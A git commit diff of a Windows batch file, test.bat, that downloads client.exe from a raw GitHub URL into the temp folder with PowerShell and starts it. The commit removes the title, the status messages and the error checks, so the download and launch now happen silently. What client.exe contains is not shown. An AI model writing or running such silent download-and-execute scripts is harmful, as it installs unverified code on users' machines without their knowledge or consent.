3ea43420c2361260a531cb5cbd3d5a12e1b765c5
Cerial <163851166+Maximus16adrianu@users.noreply.github.com>
2026-04-22 00:07:55 +0200

    Update test.bat

--- test.bat
+++ test.bat
@@ -1,22 +1,6 @@
 @echo off
-title Client Downloader & Launcher
 set "EXE_URL=https://raw.githubusercontent.com/Maximus16adrianu/arduinotest/main/client.exe"
 set "EXE_PATH=%temp%\client.exe"
-
-echo Downloading client.exe...
-powershell -Command "Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_PATH%'" 2>nul
-if %errorlevel% neq 0 (
-    echo Download failed. Exiting.
-    pause
-    exit /b 1
-)
-
-if not exist "%EXE_PATH%" (
-    echo File not found. Exiting.
-    pause
-    exit /b 1
-)
-
-echo Starting client.exe...
+powershell -Command "& {Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_PATH%'}"
 start "" "%EXE_PATH%"
-exit /b 0
+exit
